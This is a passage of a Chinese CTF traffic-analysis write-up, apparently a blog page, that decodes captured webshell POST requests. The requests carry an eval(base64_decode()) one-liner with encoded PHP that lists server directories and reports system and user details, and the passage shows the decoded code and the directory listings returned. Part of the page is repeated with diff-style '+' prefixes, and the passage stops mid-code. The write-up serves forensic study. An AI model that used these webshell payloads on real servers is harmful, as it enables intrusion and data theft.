class="body"><p>然后查看了文件夹内容以及权限，发现是<code>777</code>，可以下载文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>action 如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7</span><br></pre></td></tr></table></figure><p>解码并且格式化后代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试打开目录</span></span><br><span class="line"><span class="variable">$F</span> = @<span class="title function_ invoke__">opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$F</span> === <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果目录打开失败，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化变量用于存储目录和文件列表</span></span><br><span class="line">    <span class="variable">$M</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="variable">$L</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取目录中的每个条目</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$N</span> = @<span class="title function_ invoke__">readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">        <span class="variable">$P</span> = <span class="variable">$D</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$N</span>; <span class="comment">// 构建完整的文件路径</span></span><br><span class="line">        <span class="variable">$T</span> = @<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, @<span class="title function_ invoke__">filemtime</span>(<span class="variable">$P</span>)); <span class="comment">// 获取文件最后修改时间</span></span><br><span class="line">        <span class="variable">$E</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">base_convert</span>(@<span class="title function_ invoke__">fileperms</span>(<span class="variable">$P</span>), <span class="number">10</span>, <span class="number">8</span>), -<span class="number">4</span>); <span class="comment">// 获取文件权限</span></span><br><span class="line">        <span class="variable">$R</span> = <span class="string">&quot;\t&quot;</span> . <span class="variable">$T</span> . <span class="string">&quot;\t&quot;</span> . @<span class="title function_ invoke__">filesize</span>(<span class="variable">$P</span>) . <span class="string">&quot;\t&quot;</span> . <span class="variable">$E</span> . <span class="string">&quot;&quot;</span>; <span class="comment">// 构建输出格式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据是否为目录，将文件或目录信息添加到相应的变量中</span></span><br><span class="line">        <span class="keyword">if</span> (@<span class="title function_ invoke__">is_dir</span>(<span class="variable">$P</span>)) &#123;</span><br><span class="line">            <span class="variable">$M</span> .= <span class="variable">$N</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$L</span> .= <span class="variable">$N</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出目录和文件列表</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$M</span> . <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭目录句柄</span></span><br><span class="line">    @<span class="title function_ invoke__">closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>代码功能为获取文件夹的内容，需要参数<code>z1</code>。<br>此处<code>z1</code>：<code>RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D</code>，解码后为<code>D:\wamp64\www\upload</code>，将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:38:58	0	0777</span><br><span class="line">../    2017-12-08 11:39:10	4096	0777</span><br><span class="line">1.php    2017-12-08 11:33:16	33	0666</span><br><span class="line">flag.txt    2017-12-08 11:35:29	17	0666</span><br><span class="line">hello.zip    2017-12-08 09:32:36	224	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="yellow"><div class="body"><p>我们可以注意到有个flag.txt和hello.zip（我们要的flag在中hello.zip，其实flag.txt并没有获取）</p></div></div></div></details><details class="folder" index="2"><summary><span>查看文件夹D:\wamp64\www\</span></summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XHd3d1w%3D</code>，解码后为<code>D:\wamp64\www\</code>，将输出格式化后为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:39:10	4096	0777</span><br><span class="line">../    2017-11-17 18:15:03	4096	0777</span><br><span class="line">admin/    2017-11-17 18:15:53	8192	0777</span><br><span class="line">install/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">tools/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">typecho/    2017-12-08 11:39:10	4096	0777</span><br><span class="line">upload/    2017-12-08 11:38:58	0	0777</span><br><span class="line">usr/    2017-11-17 18:15:54	0	0777</span><br><span class="line">var/    2017-11-17 18:15:54	4096	0777</span><br><span class="line">.gitattributes    2015-05-02 05:31:05	386	0666</span><br><span class="line">.gitignore    2015-05-02 05:31:05	234	0666</span><br><span class="line">.gitmodules    2015-05-02 05:31:05	0	0666</span><br><span class="line">.travis.yml    2015-05-02 05:31:05	114	0666</span><br><span class="line">aa.php    2017-10-27 16:02:31	26	0666</span><br><span class="line">changelog.txt    2015-05-02 05:31:05	2135	0666</span><br><span class="line">config.inc.php    2017-10-26 14:01:04	1521	0666</span><br><span class="line">index.php    2015-05-02 05:31:05	721	0666</span><br><span class="line">install.php    2015-05-02 05:31:05	47405	0666</span><br><span class="line">license.txt    2015-05-02 05:31:05	14974	0666</span><br><span class="line">p0.php    2017-10-26 14:31:28	26	0666</span><br><span class="line">README.md    2015-05-02 05:31:05	205	0666</span><br><span class="line">todo.txt    2015-05-02 05:31:05	122	0666</span><br><span class="line">x1n.php    2017-10-26 14:51:13	27	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details><details class="folder" index="3"><summary><span>查看文件夹D:\wamp64\</span></summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XA%3D%3D</code>，解码后为<code>D:\wamp64\</code>，结果格式化为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-11-17 18:15:03	4096	0777</span><br><span class="line">../    2017-12-08 04:45:53	4096	0777</span><br><span class="line">alias/    2017-11-17 18:15:03	0	0777</span><br><span class="line">apps/    2017-11-17 18:15:03	0	0777</span><br><span class="line">bin/    2017-11-17 18:15:24	0	0777</span><br><span class="line">cgi-bin/    2017-11-17 18:15:32	0	0777</span><br><span class="line">lang/    2017-11-17 18:15:32	4096	0777</span><br><span class="line">logs/    2017-11-17 18:15:32	0	0777</span><br><span class="line">scripts/    2017-11-17 18:15:32	4096	0777</span><br><span class="line">tmp/    2017-11-27 06:51:26	40960	0777</span><br><span class="line">www/    2017-12-08 11:39:10	4096	0777</span><br><span class="line">barimage.bmp    2010-12-31 01:39:42	4790	0666</span><br><span class="line">images_off.bmp    2016-08-01 08:21:38	26934	0666</span><br><span class="line">images_on.bmp    2016-08-01 08:22:36	26934	0666</span><br><span class="line">install-english.txt    2016-10-16 07:09:46	3380	0666</span><br><span class="line">license-english.txt    2015-11-06 03:00:26	8156	0666</span><br><span class="line">read_after_install-english.txt    2016-03-08 11:45:22	1191	0666</span><br><span class="line">unins000.dat    2017-10-10 07:11:50	972306	0666</span><br><span class="line">unins000.exe    2017-10-10 07:09:38	1401105	0777</span><br><span class="line">uninstall_services.bat    2017-10-10 07:09:51	132	0777</span><br><span class="line">wampmanager.conf    2017-11-14 14:28:47	1636	0666</span><br><span class="line">wampmanager.exe    2008-09-03 07:46:36	1233408	0777</span><br><span class="line">wampmanager.ini    2017-12-08 11:33:55	508782	0666</span><br><span class="line">wampmanager.tpl    2016-08-22 02:42:00	24039	0666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details></div>
+<p><img src="/assets/CTF/Misc/traffic_analysis_1/3.png" alt="traffic_analysis_1"></p>
+<h3 id="2-php-代码分析"><a href="#2-php-代码分析" class="headerlink" title="2. php 代码分析"></a>2. php 代码分析</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><p>查看文件详情</p>
+</summary><div class="body"><p>首先找到 1.php ，我们进行分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><ul><li>base64_decode：以下内容为 base64 编码</li><li>action：入侵行为，值经过了 base64 编码与 urlencode 编码，通过 CyberChef 双重解码（URL Decode, From Base64）后得到 php 代码格式化后如下</li></ul><p><img src="/assets/CTF/Misc/traffic_analysis_1/4.png" alt="traffic_analysis_1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本无限期运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，该功能会自动在字符串的引号前添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前脚本的目录路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果SCRIPT_FILENAME为空，则尝试使用PATH_TRANSLATED</span></span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将目录路径添加到变量R，并添加制表符作为分隔</span></span><br><span class="line"><span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查目录路径是否以根目录符号&quot;/&quot;开头</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不是，遍历A到Z的驱动器，如果存在，则添加到R</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加制表符作为分隔</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用posix_getegid和posix_getpwuid获取当前用户的用户名，如果函数不存在，则使用get_current_user</span></span><br><span class="line"><span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;posix_getegid&#x27;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$usr</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>] : @<span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line"><span class="comment">// 将系统信息和用户信息添加到R</span></span><br><span class="line"><span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>();</span><br><span class="line"><span class="variable">$R</span> .= <span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$R</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">D:/wamp64/www/upload</span><br><span class="line">C:D:E:</span><br><span class="line">Windows NT DESKTOP-5E59GR7 10.0 build 15063 (Windows 10) AMD64</span><br><span class="line">(SYSTEM)</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="orange"><div class="title">需要注意的点</div><div class="body"><p>输出的前面有个<code>-&gt;|</code>，输出的后面有个<code>|&lt;-</code>，可能会影响后续下载文件的内容。</p></div></div></div></details><details class="folder" index="1"><summary><p>查看文件夹D:\wamp64\www\upload</p>
+</summary><div class="body"><p>然后查看了文件夹内容以及权限，发现是<code>777</code>，可以下载文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>action 如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7</span><br></pre></td></tr></table></figure><p>解码并且格式化后代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试打开目录</span></span><br><span class="line"><span class="variable">$F</span> = @<span class="title function_ invoke__">opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$F</span> === <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果目录打开失败，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化变量用于存储目录和文件列表</span></span><br><span class="line">    <span class="variable">$M</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="variable">$L</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取目录中的每个条目</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$N</span> = @<span class="title function_ invoke__">readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">        <span class="variable">$P</span> = <span class="variable">$D</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$N</span>; <span class="comment">// 构建完整的文件路径</span></span><br><span class="line">        <span class="variable">$T</span> = @<span class="title function_ invoke__">date</span>(<span 